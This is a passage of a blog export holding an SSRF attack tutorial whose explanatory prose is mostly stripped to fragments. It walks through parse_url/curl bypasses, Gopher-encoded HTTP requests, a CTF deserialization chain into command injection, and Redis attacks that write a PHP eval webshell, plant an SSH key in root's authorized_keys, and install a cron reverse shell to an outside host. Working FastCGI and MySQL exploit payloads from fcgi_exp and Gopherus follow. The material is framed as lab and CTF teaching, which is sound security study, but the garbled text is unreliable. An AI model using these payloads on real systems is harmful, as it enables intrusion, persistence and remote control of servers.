{\n\tdie('Hacker!');\n}\n```\n\npython11211WEB\n\n![image-20210113133210683](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201658.jpeg)\n\nurl8011211\n\nssrf.php?url=127.0.0.1:11211:80/flag.txt\n\n![image-20210113133242461](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202332.jpeg)\n\n11211flag.txtBlackHat\n\n![1610601312_5fffd36035478c41c2c18.png!small?1610601312696](https://image.3001.net/images/20210114/1610601312_5fffd36035478c41c2c18.png!small?1610601312696)\n\nreadfile()11211parse\\_url()80WAF\n\nhost\n\n![1610601347_5fffd383dfc1a3982425f.png!small?1610601348433](https://image.3001.net/images/20210114/1610601347_5fffd383dfc1a3982425f.png!small?1610601348433)\n\nreadfile()@evil.comparse\\_url()@google.comparse\\_url()host\n\n**2curlparse\\_urlhost**\n\n\n\n![1610601386_5fffd3aa565a51587d90c.png!small?1610601386867](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202234.jpeg)\n\ncurl()@parse\\_url()@parse\\_url()host\n\n\n\n```\n<?php\nhighlight\\_file(\\_\\_FILE\\_\\_);\nfunction check\\_inner\\_ip($url)\n{\n    $match\\_result=preg\\_match('/^(http|https)?:\\\\/\\\\/.\\*(\\\\/)?.\\*$/',$url);\n    if (!$match\\_result)\n    {\n        die('url fomat error');\n    }\n    try\n    {\n        $url\\_parse=parse\\_url($url);\n    }\n    catch(Exception $e)\n    {\n        die('url fomat error');\n        return false;\n    }\n    $hostname=$url\\_parse\\['host'\\];\n    $ip=gethostbyname($hostname);\n    $int\\_ip=ip2long($ip);\n    return ip2long('127.0.0.0')>>24 == $int\\_ip>>24 || ip2long('10.0.0.0')>>24 == $int\\_ip>>24 || ip2long('172.16.0.0')>>20 == $int\\_ip>>20 || ip2long('192.168.0.0')>>16 == $int\\_ip>>16;// ip\n}\nfunction safe\\_request\\_url($url)\n{\n    if (check\\_inner\\_ip($url))\n    {\n        echo $url.' is inner ip';\n    }\n    else\n    {\n        $ch = curl\\_init();\n        curl\\_setopt($ch, CURLOPT\\_URL, $url);\n        curl\\_setopt($ch, CURLOPT\\_RETURNTRANSFER, 1);\n        curl\\_setopt($ch, CURLOPT\\_HEADER, 0);\n        $output = curl\\_exec($ch);\n        $result\\_info = curl\\_getinfo($ch);\n        if ($result\\_info\\['redirect\\_url'\\])\n        {\n            safe\\_request\\_url($result\\_info\\['redirect\\_url'\\]);\n        }\n        curl\\_close($ch);\n        var\\_dump($output);\n    }\n}\n$url = $\\_GET\\['url'\\];\nif(!empty($url)){\n    safe\\_request\\_url($url);\n}\n?>\n```\n\n`check_inner_ip``url_parse()`IP IP `curl()` url curlparse\\_url`parse_url()``curl()`paylaod\n\nssrf.php?url=http://@127.0.0.1:80@www.baidu.com/flag.php\n\n![image-20210113134443846](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202304.jpeg)\n\n [\\[2020 \\]doyouknowssrf](https://whoamianony.top/2020/11/24/ctf-bi-sai-ji-lu/2020-shou-jie-xiang-yun-bei-wang-luo-an-quan-da-sai-writeup/#toc-heading-5)\n\n## Gopher\n\n### GopherSSRF\n\nGopherInternetInternetInternetWWWGopherInternetGopherTCP 70WWWGopher\n\nGopherSSRFSSRFGopherGETPOSTGETPOSTGopherpayloadSSRFRedisMySqlFastCGISSRF\n\n**1Gopher**\n\nURL: gopher://<host>:<port>/<gopher-path>\\_TCP  \n\n\\# \"\\_\"\"\\_\"TCP\"\\_\"\n\n+   gopher70\n    \n+   POST`%0d%0a``%0a`&URL\n    \n\n> GopherHTTPGETHTTPgopherHTTP\n>\n> 1.  HTTP\n>\n> 2.  URL`%0a``%0d%0a`\n>\n> 3.  gopher\n>\n\n**2GopherHTTP GET**\n\n\n\n```\n// echo.php  \n<?php  \necho \"Hello \".$\\_GET\\[\"whoami\"\\].\"\\\\n\"  \n?>\n```\n\npayloadGETHTTP\n\n```\nGET /echo.php?whoami=Bunny HTTP/1.1  \nHost: 47.xxx.xxx.72\n```\n\nGopherpayload\n\n```\nimport urllib.parse  \npayload =\\\\  \n\"\"\"GET /echo.php?whoami=Bunny HTTP/1.1  \nHost: 47.xxx.xxx.72  \n\"\"\"    \n```\n\n\\# http  \n\n```\ntmp = urllib.parse.quote(payload)  \nnew = tmp.replace('%0A','%0D%0A')  \nresult = 'gopher://47.xxx.xxx.72:80/'+'\\_'+new  \nprint(result)\n```\n\n![image-20210113170748727](https://image.3001.net/images/20210114/1610598015_5fffc67f7078252c1e5a9.png!small)\n\n> ****\n>\n> 1.  ?URL%3f\n>\n> 2.  %0d%0a,%0a\n>\n> 3.  HTTP%0d%0aHTTP\n>\n\n\n\n```\ncurl gopher://47.xxx.xxx.72:80/\\_GET%20/echo.php%3Fwhoami%3DBunny%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0A\n```\n\n![image-20210113171043970](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202964.jpeg)\n\nGETHello Bunny\n\n**3GopherHTTP POST**\n\n\n\n```\n// echo.php  \n<?php  \necho \"Hello \".$\\_POST\\[\"whoami\"\\].\"\\\\n\"  \n?>\n```\n\npayloadPOSTHTTP\n\n```\nPOST /echo.php HTTP/1.1\nHost: 47.xxx.xxx.72\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 12\n\nwhoami=Bunny\n```\n\n**HTTPPOSTPOSTHostContent-TypeContent-LengthGETContent-Lengthwhoami=Bunny**\n\nPOSTURLgopher\n\n```\nimport urllib.parse\npayload =\\\\\n\"\"\"POST /echo.php HTTP/1.1\nHost: 47.xxx.xxx.72\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 12\n\nwhoami=Bunny\n\"\"\"  \n```\n\n\n# http\n```\ntmp = urllib.parse.quote(payload)\nnew = tmp.replace('%0A','%0D%0A')\nresult = 'gopher://47.xxx.xxx.72:80/'+'\\_'+new\nprint(result)\n```\n\n![image-20210113171513366](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202109.jpeg)\n\n\n\n```\ncurl gopher://47.xxx.xxx.72:80/\\_POST%20/echo.php%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Awhoami%3DBunny%0D%0A\n```\n\n![image-20210113171641047](https://image.3001.net/images/20210114/1610598018_5fffc682e955f917dcc6e.png!small)\n\nPOSTHello Bunny\n\n**\\[2020 \\]Web1**GopherHTTP POSTSSRF\n\n### \\[2020 \\]Web1\n\n\n\n![image-20200921134331679](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202960.jpeg)\n\nSSRFurl`file``ftp``127.0.0.1`tool.phpNot localhostssrftool.phppayload\n\n```\n<?php  \nclass Welcome {  \nprotected $url = \"http://127.0.0.1/tool.php\";\n\n}  \n$poc = new Welcome;  \n//echo serialize($poc);  \necho urlencode(serialize($poc));  \n?>\n```\n\n\n\n```\nO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Ftool.php%22%3B%7D\n\n// O:7:\"Welcome\":1:{s:6:\"\\*url\";s:25:\"http://127.0.0.1/tool.php\";}\n```\n\nWelcome12`__destruct()`\n\n![image-20200921134812338](https://image.3001.net/images/20210114/1610598020_5fffc684e27d96d0c30be.png!small)\n\ntool.php\n\n```\n#tool.php\n<?php\nerror\\_reporting(0);\n$respect\\_show\\_ping = function($params) {\n   extract($params);\n   $ip = isset($ip) ? $ip :'127.0.0.1';\n   system('ping -c 1 '.$ip);\n};\nif ($\\_SERVER\\[\"REMOTE\\_ADDR\"\\] !== \"127.0.0.1\"){\n   echo '<h2>Not localhost!</h2>';\n}\nelse {\n   highlight\\_file(\\_\\_FILE\\_\\_);\n   $respect\\_show\\_ping($\\_POST);\n}\n?>\n```\n\ntool.phpREMOTE\\_ADDR127.0.0.1REMOTE\\_ADDRIPIPtcpIPREMOTE\\_ADDRIPX-Forwarded-For\n\nREMOTE\\_ADDR127.0.0.1REMOTE\\_ADDRREMOTE\\_ADDR127.0.0.1X-Forwarded-ForSSRF\n\nindex.phpSSRFgopherPOSTtool.phpREMOTE\\_ADDR127.0.0.1\n\nSSRFgopherPOST\n\n```\nimport urllib.parse\ntest =\\\\\n\"\"\"POST /tool.php HTTP/1.1\nHost: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 13\n\nip=;cat /flag\n\"\"\"  \n```\n\n#http\n\n```\ntmp = urllib.parse.quote(test)\nnew = tmp.replace('%0A','%0D%0A')\nresult = 'gopher://127.0.0.1:80/'+'\\_'+new\nprint(result)\n```\n\npayloadHostgopherHost127.0.0.1\n\ngopherpayload\n\n```\ngopher://127.0.0.1:80/\\_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A\n```\n\nexp\n\n```\n<?php\nclass Welcome {\n    protected $url = \"gopher://127.0.0.1:80/\\_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A\";\n    \n}\n$poc = new Welcome;\n//echo serialize($poc);\necho urlencode(serialize($poc));\n?>\n```\n\npayload\n\n```\nO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A197%3A%22gopher%3A%2F%2F127.0.0.1%3A80%2F\\_POST%2520%2Ftool.php%2520HTTP%2F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2Fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2Fflag%250D%250A%22%3B%7D\n\n\n```\n\nWelcome12`__destruct()`\n\n![image-20200921135622488](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202364.jpeg)\n\n\n\n****POSTGETURLpayloadurl%20curl\\_execgopherURLpayloadURL\n\n```\ngopher%3a%2f%2f127.0.0.1%3a80%2f\\_POST%2520%2ftool.php%2520HTTP%2f1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2fflag%250D%250A\n```\n\n\n\n## Redis\n\n![20210113151633.png](https://image.3001.net/images/20210114/1610598023_5fffc6877d72429d2cbae.png!small)\n\nRedisRedisRemote Dictionary Server )ANSI CKey-ValueAPI\n\n> **Redis**\n>\n> Redis  0.0.0.0:6379 ip  Redis  Redis  Redis  Redis  Redis  config ssh /root/.ssh  authotrized\\_keys ssh\n>\n> \n>\n> +   redis  0.0.0.0:6379ip\n>\n> +   redis\n>\n\nSSRF6379RedisRedisGopherRedis Redis  config WebShellSSHShellRedisweb~/.ssh/var/spool/crondbfilenamesavebgsave\n\nRedisIP\n\n![image-20210113190430425](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202356.jpeg)\n\nIP192.168.52.1316379RedisUbuntuSSRF192.168.52.131Redis\n\n### WebShell\n\nredis\n\n```\nflushall  \nset 1 '<?php eval($\\_POST\\[\"whoami\"\\]);?>'  \nconfig set dir /var/www/html  \nconfig set dbfilename shell.php  \nsave\n```\n\nGopher~~~\n\n```\nimport urllib\nprotocol=\"gopher://\"\nip=\"192.168.52.131\"\nport=\"6379\"\nshell=\"\\\\n\\\\n<?php eval($\\_POST\\[\\\\\"whoami\\\\\"\\]);?>\\\\n\\\\n\"\nfilename=\"shell.php\"\npath=\"/var/www/html\"\npasswd=\"\"\ncmd=\\[\"flushall\",\n\t \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")),\n\t \"config set dir {}\".format(path),\n\t \"config set dbfilename {}\".format(filename),\n\t \"save\"\n\t \\]\nif passwd:\n\tcmd.insert(0,\"AUTH {}\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/\\_\"\ndef redis\\_format(arr):\n\tCRLF=\"\\\\r\\\\n\"\n\tredis\\_arr = arr.split(\" \")\n\tcmd=\"\"\n\tcmd+=\"\\*\"+str(len(redis\\_arr))\n\tfor x in redis\\_arr:\n\t\tcmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \")\n\tcmd+=CRLF\n\treturn cmd\n\nif \\_\\_name\\_\\_==\"\\_\\_main\\_\\_\":\n\tfor x in cmd:\n\t\tpayload += urllib.quote(redis\\_format(x))\n\tprint payload\n```\n\npaylaod\n\n![image-20210113175116867](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202688.jpeg)\n\npayloadurlpayloadGETUbuntuSSRFpayload\n\n```\nssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F\\_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524\\_POST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A\n```\n\n192.168.52.131WebShell\n\n![image-20210113185919592](https://image.3001.net/images/20210114/1610598027_5fffc68b3b060b67168e8.png!small)\n\n### SSH\n\nRedis~/.sshSSH~/.ssh\n\nredis\n\n```\nflushall  \nset 1 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami  \n'  \nconfig set dir /root/.ssh/  \nconfig set dbfilename authorized\\_keys  \nsave\n```\n\nGopher\n\n```\nimport urllib\nprotocol=\"gopher://\"\nip=\"192.168.52.131\"\nport=\"6379\"\nssh\\_pub=\"\\\\n\\\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami\\\\n\\\\n\"\nfilename=\"authorized\\_keys\"\npath=\"/root/.ssh/\"\npasswd=\"\"\ncmd=\\[\"flushall\",\n\t \"set 1 {}\".format(ssh\\_pub.replace(\" \",\"${IFS}\")),\n\t \"config set dir {}\".format(path),\n\t \"config set dbfilename {}\".format(filename),\n\t \"save\"\n\t \\]\nif passwd:\n\tcmd.insert(0,\"AUTH {}\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/\\_\"\ndef redis\\_format(arr):\n\tCRLF=\"\\\\r\\\\n\"\n\tredis\\_arr = arr.split(\" \")\n\tcmd=\"\"\n\tcmd+=\"\\*\"+str(len(redis\\_arr))\n\tfor x in redis\\_arr:\n\t\tcmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \")\n\tcmd+=CRLF\n\treturn cmd\n\nif \\_\\_name\\_\\_==\"\\_\\_main\\_\\_\":\n\tfor x in cmd:\n\t\tpayload += urllib.quote(redis\\_format(x))\n\tprint payload\n```\n\npayloadurlUbuntuSSRF\n\n```\nssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F\\_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524568%250D%250A%250A%250Assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E%2F45IEs%2F9a6AWfXb6iwzo%252BD62y8MOmt%252Bsct27ZxGOcRR95FT6zrfFxqt2h56oLwml%2FTrxy5sExSQ%2FcvvLwUTWb3ntJYyh2eGkQnOf2d%252Bax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH%2F4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd%2FbWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ%2FNnHKyWtI%2FOzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe%252BXqQnjxtk4giopiFfRu8winE9scqlIA5Iu%2Fd3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg%2FOOhoA3iKNhJ%2FJT31TU9E24dGh2Ei8K%252BPpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl%252BSOsVHpNqwFcrgsq%2FWR5BGqnu54vTTdJh0pSrl%252BtniHEnWWU%253D%2520root%2540whoami%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%250D%250A%2Froot%2F.ssh%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized\\_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A\n```\n\n192.168.52.131SSH\n\n![image-20210113185745287](https://image.3001.net/images/20210114/1610598028_5fffc68c0f8d37e46a560.png!small)\n\nssh\n\n![image-20210113193746288](https://image.3001.net/images/20210114/1610598029_5fffc68d802a6e5c757d2.png!small)\n\n### Shell\n\n**Centos**\n\nredis\n\n```\nflushall  \nset 1 '\\\\n\\\\n\\*/1 \\* \\* \\* \\* bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1\\\\n\\\\n'  \nconfig set dir /var/spool/cron/  \nconfig set dbfilename root  \nsave  \n\n// 47.xxx.xxx.72vpsIP\n\nGopher\n\nimport urllib\nprotocol=\"gopher://\"\nip=\"192.168.52.131\"\nport=\"6379\"\nreverse\\_ip=\"47.xxx.xxx.72\"\nreverse\\_port=\"2333\"\ncron=\"\\\\n\\\\n\\\\n\\\\n\\*/1 \\* \\* \\* \\* bash -i >& /dev/tcp/%s/%s 0>&1\\\\n\\\\n\\\\n\\\\n\"%(reverse\\_ip,reverse\\_port)\nfilename=\"root\"\npath=\"/var/spool/cron\"\npasswd=\"\"\ncmd=\\[\"flushall\",\n\t \"set 1 {}\".format(cron.replace(\" \",\"${IFS}\")),\n\t \"config set dir {}\".format(path),\n\t \"config set dbfilename {}\".format(filename),\n\t \"save\"\n\t \\]\nif passwd:\n\tcmd.insert(0,\"AUTH {}\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/\\_\"\ndef redis\\_format(arr):\n\tCRLF=\"\\\\r\\\\n\"\n\tredis\\_arr = arr.split(\" \")\n\tcmd=\"\"\n\tcmd+=\"\\*\"+str(len(redis\\_arr))\n\tfor x in redis\\_arr:\n\t\tcmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \")\n\tcmd+=CRLF\n\treturn cmd\n\nif \\_\\_name\\_\\_==\"\\_\\_main\\_\\_\":\n\tfor x in cmd:\n\t\tpayload += urllib.quote(redis\\_format(x))\n\tprint payload\n```\n\npayloadurlUbuntuSSRF192.168.52.131vpsshell\n\n![image-20210113184927766](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202362.jpeg)\n\n[\\[GKCTF2020\\]EZ-EzWeb](https://blog.csdn.net/qq_45521281/article/details/106532501)Redis\n\n## FastCGI\n\nFastCGIFast Common Gateway InterfaceFastCGIWebFastCGICGIFastCGICGI\n\n> ********ApacheWebCGICGIPHPPHPphp.iniCGIWeb serverPHP Web\n>\n> CGIFastCGICGICGI**CGI****FastCGICGI** \n\n### php-fpm\n\nFPMFastCGI FastCGI PHP FastCGI \n\nFastCGI`SCRIPT_FILENAME': '/var/www/html/index.php`php-fpmphp-fpm\n\nPHP 5.3.9PHPphp-fpmphpphp4PHPPHP\\_ADMIN\\_VALUEPHP\\_VALUEPHP\n\nPHP`auto_prepend_file = php://input;allow_url_include = On`PHP`auto_prepend_file``php://input`POSTFastCGIbodyphp-fpm\n\n[SSRFFastCGI](https://bbs.ichunqiu.com/thread-58455-1-1.html)\n\n\n\n![image-20210113225311760](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202250.jpeg)\n\nWEBUbuntu192.168.43.166SSRF\n\n![image-20210113211319025](https://image.3001.net/images/20210114/1610598034_5fffc69243862a502d80a.png!small)\n\nWEBUbuntuFastCGISSRFFastCGI\n\n> fpm0.0.0.0:9000php-fpmSSRF9000php-fpmfcgi\\_expphp-fpm\n>\n> fpm0.0.0.0:9000php-fpmUbuntuSSRFphp-fpmUbuntuSSRF\n\n### fcgi\\_exp\n\n[https://github.com/piaca/fcgi\\_exp](https://github.com/piaca/fcgi_exp)\n\nphp-fpmphp-fpmpayload\n\ngo\n\ngo build fcgi\\_exp.go                    # fcgi\\_exp.go\n\n`nc -lvvp 2333 > fcg_exp.txt`2333 fcgi\\_exppayload2333payload\n\n./fcgi\\_exp system 127.0.0.1 2333 /var/www/html/index.php \"id\"\n\n![image-20210113205718209](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202135.jpeg)\n\nfcg\\_exp.txtpayload\n\n![image-20210113205857913](https://image.3001.net/images/20210114/1610598036_5fffc694cc3e3da7a21ec.png!small)\n\nfcg\\_exp.txtpayloadurl\n\n\\# -\\*- coding: UTF-8 -\\*-  \nfrom urllib.parse import quote, unquote, urlencode  \n\nfile = open('fcg\\_exp.txt','r')  \npayload = file.read()  \nprint(\"gopher://127.0.0.1:9000/\\_\"+quote(payload).replace(\"%0A\",\"%0D\").replace(\"%2F\",\"/\"))\n\npythonpayload\n\n![image-20210113210102251](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202737.jpeg)\n\npayloadurlpayload?url=\n\n```\nssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F\\_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2514%2504%2500%250F%2510SERVER\\_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE\\_ADDR127.0.0.1%250F%2508SERVER\\_PROTOCOLHTTP%2F1.1%250E%2502CONTENT\\_LENGTH56%250E%2504REQUEST\\_METHODPOST%2509%255BPHP\\_VALUEallow\\_url\\_include%2520%253D%2520On%250Ddisable\\_functions%2520%253D%2520%250Dsafe\\_mode%2520%253D%2520Off%250Dauto\\_prepend\\_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT\\_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT\\_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2500%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----0vcdb34oju09b8fd-----%250D%2527%2529%253B%253F%253E\n```\n\n\n\n![image-20210113211227610](https://image.3001.net/images/20210114/1610598040_5fffc6982e020c76d98d2.png!small)\n\n### Gopherus\n\n[https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)\n\nGopherpayloadSSRFRedisFastCGIMySql\n\nGopherusFastCGIpayload\n\npython gopherus.py --exploit fastcgi  \n/var/www/html/index.php    # php  \nid    # \n\n![image-20201206134630782](https://image.3001.net/images/20210114/1610598041_5fffc69924b889c84f935.png!small)\n\npayloadurlpayload?url=\n\n```\nssrf.php?url=gopher%3A//127.0.0.1%3A9000/\\_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER\\_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE\\_ADDR127.0.0.1%250F%2508SERVER\\_PROTOCOLHTTP/1.1%250E%2502CONTENT\\_LENGTH54%250E%2504REQUEST\\_METHODPOST%2509KPHP\\_VALUEallow\\_url\\_include%2520%253D%2520On%250Adisable\\_functions%2520%253D%2520%250Aauto\\_prepend\\_file%2520%253D%2520php%253A//input%250F%2517SCRIPT\\_FILENAME/var/www/html/index.php%250D%2501DOCUMENT\\_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500\n```\n\n![image-20210113211649519](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202253.jpeg)\n\n\n\n## MySql\n\n![20210113152106.png](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202474.jpeg)\n\nMySqlMySQLMySQL / (scramble)\n\n(scramble)Gopher\n\n\n\n![image-20210113225607672](https://image.3001.net/images/20210114/1610598044_5fffc69c8db745aea464b.png!small)\n\nUbuntuWEBSSRFMySqlwhoami\n\nGopherusUbuntuMySqlpayload\n\npython gopherus.py --exploit mysql  \nwhoami    #   \nshow databases;    # sql\n\npayload\n\n![image-20210114004602164](https://image.3001.net/images/20210114/1610598046_5fffc69e8d085bc01c7a3.png!small)\n\npaylaodurlpayload?url=......\n\n## Ending......\n\nSSRF\n\n+   ssrf-lab[https://github.com/fengwenhua/ssrf-lab](https://github.com/fengwenhua/ssrf-lab)\n\n REST API  WebHook  SSRF [https://www.heibai.org/post/1287.html](https://www.heibai.org/post/1287.html)\n\n![20210112124413.jpg](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202809.jpeg)\n\n\n\n[https://whoamianony.top/](https://whoamianony.top/)\n\n>  [https://blog.csdn.net/Ping\\_Pig/article/details/99412487](https://blog.csdn.net/Ping_Pig/article/details/99412487)\n>\n> [https://www.cnblogs.com/iors/p/9777571.html](https://www.cnblogs.com/iors/p/9777571.html)\n>\n> [https://blog.csdn.net/qq\\_43625917/article/details/104528645?utm\\_source=app](https://blog.csdn.net/qq_43625917/article/details/104528645?utm_source=app)\n>\n> [https://xz.aliyun.com/t/2115](https://xz.aliyun.com/t/2115)\n>\n> [https://blog.csdn.net/weixin\\_36343353/article/details/112277580](https://blog.csdn.net/weixin_36343353/article/details/112277580)\n>\n> [https://blog.csdn.net/cj\\_Allen/article/details/106855893](https://blog.csdn.net/cj_Allen/article/details/106855893)\n>\n> [https://www.redteaming.top/2019/07/15/RedisSSRF/#RedisgopherSSRF](https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/#Redis%E9%85%8D%E5%90%88gopher%E5%8D%8F%E8%AE%AE%E8%BF%9B%E8%A1%8CSSRF)\n>\n> [https://bbs.ichunqiu.com/thread-58455-1-1.html](https://bbs.ichunqiu.com/thread-58455-1-1.html)\n>\n> [https://blog.chaitin.cn/gopher-attack-surfaces/](https://blog.chaitin.cn/gopher-attack-surfaces/)\n>\n> [https://www.anquanke.com/post/id/197431#h2-6](https://www.anquanke.com/post/id/197431#h2-6)\n>\n> [https://www.anquanke.com/post/id/145519#h2-14](https://www.anquanke.com/post/id/145519#h2-14)","slug":"SSRF","published":1,"updated":"2024-04-25T14:08:59.837Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvfbkxtj0000vm76exfu69c3","content":"<p><img  \n                       lazyload\n                       alt=\"image\"\n                       